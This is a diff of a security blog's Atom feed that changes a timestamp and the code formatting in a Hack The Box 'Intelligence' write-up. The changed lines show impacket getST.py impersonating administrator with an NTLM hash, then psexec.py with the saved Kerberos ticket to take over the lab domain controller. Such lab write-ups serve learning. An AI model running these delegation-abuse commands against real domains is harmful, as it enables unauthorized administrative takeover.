@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.2">Jekyll</generator><link href="https://omnisl4sh.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://omnisl4sh.github.io/" rel="alternate" type="text/html" /><updated>2022-07-22T14:54:41+02:00</updated><id>https://omnisl4sh.github.io/feed.xml</id><title type="html">OmniSl4sh’s Blog</title><entry><title type="html">HTB Writeup [Windows - Insane] - APT</title><link href="https://omnisl4sh.github.io/2022/07/07/APT.html" rel="alternate" type="text/html" title="HTB Writeup [Windows - Insane] - APT" /><published>2022-07-07T00:00:00+02:00</published><updated>2022-07-07T00:00:00+02:00</updated><id>https://omnisl4sh.github.io/2022/07/07/APT</id><content type="html" xml:base="https://omnisl4sh.github.io/2022/07/07/APT.html"><![CDATA[<p><img src="/assets/APT/APT.png" alt="APT" /></p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.2">Jekyll</generator><link href="https://omnisl4sh.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://omnisl4sh.github.io/" rel="alternate" type="text/html" /><updated>2022-08-04T15:23:30+02:00</updated><id>https://omnisl4sh.github.io/feed.xml</id><title type="html">OmniSl4sh’s Blog</title><entry><title type="html">HTB Writeup [Windows - Insane] - APT</title><link href="https://omnisl4sh.github.io/2022/07/07/APT.html" rel="alternate" type="text/html" title="HTB Writeup [Windows - Insane] - APT" /><published>2022-07-07T00:00:00+02:00</published><updated>2022-07-07T00:00:00+02:00</updated><id>https://omnisl4sh.github.io/2022/07/07/APT</id><content type="html" xml:base="https://omnisl4sh.github.io/2022/07/07/APT.html"><![CDATA[<p><img src="/assets/APT/APT.png" alt="APT" /></p>
 
 <h3 id="summary">Summary</h3>
 <ul>
@@ -786,15 +786,15 @@ Host script results:
 
 <p>We will first request the ticket using <a href="https://github.com/SecureAuthCorp/impacket"><strong>impacket</strong></a>’s <code class="language-plaintext highlighter-rouge">getST.py</code> script</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>getST.py -dc-ip 10.10.10.248 -spn 'WWW/dc.intelligence.htb' -impersonate administrator intelligence.htb/'svc_int$' -hashes :6bf735e60852b92212d512a4deadcfea
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>getST.py <span class="nt">-dc-ip</span> 10.10.10.248 <span class="nt">-spn</span> <span class="s1">'WWW/dc.intelligence.htb'</span> <span class="nt">-impersonate</span> administrator intelligence.htb/<span class="s1">'svc_int$'</span> <span class="nt">-hashes</span> :6bf735e60852b92212d512a4deadcfea
 </code></pre></div></div>
 
 <p><img src="/assets/Intelligence/getting-admin-ticket.jpg" alt="getting-admin-ticket" /></p>
 
 <p>The ticket is now saved to disk. We’re going to export it to our environment and use it to own the box:</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>export KRB5CCNAME=&lt;path/to/ticket&gt;
-psexec.py -k -no-pass intelligence.htb/administrator@dc.intelligence.htb
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">export </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>&lt;path/to/ticket&gt;
+psexec.py <span class="nt">-k</span> <span class="nt">-no-pass</span> intelligence.htb/administrator@dc.intelligence.htb
 </code></pre></div></div>
 
 <p><img src="/assets/Intelligence/box-owned.jpg" alt="box-owned" /></p>
